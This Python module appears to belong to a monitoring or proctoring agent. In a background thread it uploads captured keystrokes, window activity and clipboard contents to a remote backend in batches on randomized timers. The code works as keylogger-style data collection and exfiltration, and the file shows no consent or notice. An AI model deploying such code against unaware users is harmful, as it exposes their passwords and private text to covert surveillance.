"""
Staggered synchronization engine.
Extracts data from collectors, formats it, and uploads it securely to the Vercel backend using jittered delays.
"""
import threading
import time
import random
import httpx
from datetime import datetime, timezone
from typing import Optional

from .config import settings
from .collectors.window_collector import WindowCollector
from .collectors.clipboard_collector import ClipboardCollector
from .collectors.keystroke_collector import KeystrokeCollector

class SyncEngine:
    """
    Manages the background loop that flushes all collectors and staggers uploads to the server.
    """
    def __init__(
        self, 
        session_id: str, 
        window_collector: WindowCollector, 
        clipboard_collector: ClipboardCollector, 
        keystroke_collector: KeystrokeCollector
    ) -> None:
        self.session_id = session_id
        self._window_collector = window_collector
        self._clipboard_collector = clipboard_collector
        self._keystroke_collector = keystroke_collector
        
        self._sync_number: int = 0
        self._offline_periods: list[dict] = []
        self._disconnected_at: Optional[str] = None
        
        self._stop_event = threading.Event()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        
    def start(self) -> None:
        """Starts the background staggered sync loop."""
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        
    def stop(self) -> None:
        """Signals the background sync loop to stop and exit cleanly."""
        self._stop_event.set()
        
    def _loop(self) -> None:
        """Continuously runs the sync cycle, separated by a randomized 55-65s jitter."""
        while not self._stop_event.is_set():
            # Wait for randomized interval (55 to 65 seconds) to prevent server hammering
            jitter = random.uniform(55, 65)
            # wait() exits early if stop() is called, making shutdown responsive
            if self._stop_event.wait(jitter):
                break
                
            self._sync()
            
    def _sync(self) -> None:
        """Executes a single staggered sync cycle across all collector endpoints."""
        self._sync_number += 1
        synced_at = datetime.now(timezone.utc).isoformat()
        
        # Peek up to 500 records from all collectors to prevent giant payloads
        keystrokes = self._keystroke_collector.peek(limit=500)
        windows = self._window_collector.peek(limit=500)
        clipboard = self._clipboard_collector.peek(limit=500)
        
        headers = {
            "X-API-Key": settings.API_KEY,
            "Content-Type": "application/json"
        }
        
        # Track success of all endpoints to manage offline state using a single connection pool
        with httpx.Client(timeout=15.0) as client:
            success_k = self._upload_endpoint("/sync/keystrokes", "keystrokes", keystrokes, synced_at, headers, client)
            if success_k:
                self._keystroke_collector.pop(len(keystrokes))
            time.sleep(random.uniform(1, 3))
            
            success_w = self._upload_endpoint("/sync/windows", "windows", windows, synced_at, headers, client)
            if success_w:
                self._window_collector.pop(len(windows))
            time.sleep(random.uniform(1, 3))
            
            success_c = self._upload_endpoint("/sync/clipboard", "clipboard", clipboard, synced_at, headers, client)
            if success_c:
                self._clipboard_collector.pop(len(clipboard))
            time.sleep(random.uniform(1, 3))
            
            success_o = self._upload_endpoint("/sync/offline", "offline_periods", self._offline_periods, synced_at, headers, client)
        
        if success_o:
            self._offline_periods = []
            
        # Determine overall offline tracking based on this cycle's success
        all_succeeded = success_k and success_w and success_c and success_o
        
        if all_succeeded:
            if self._disconnected_at is not None:
                # Connection was restored; log the outage duration for the next sync cycle
                self._offline_periods.append({
                    "disconnected_at": self._disconnected_at,
                    "reconnected_at": synced_at
                })
                self._disconnected_at = None
        else:
            if self._disconnected_at is None:
                # Connection was just lost; record the moment
                self._disconnected_at = synced_at

    def _upload_endpoint(self, route: str, payload_key: str, data_list: list, synced_at: str, headers: dict, client: httpx.Client) -> bool:
        """Helper to POST specific datasets synchronously with error handling."""
        url = f"{settings.BACKEND_URL.rstrip('/')}{route}"
        payload = {
            "session_id": self.session_id,
            "sync_number": self._sync_number,
            "synced_at": synced_at,
            payload_key: data_list
        }
        
        try:
            response = client.post(url, headers=headers, json=payload)
            response.raise_for_status()
            return True
        except Exception as e:
            print(f"[SYNC] Warning: {route} upload failed — {str(e)}")
            return False
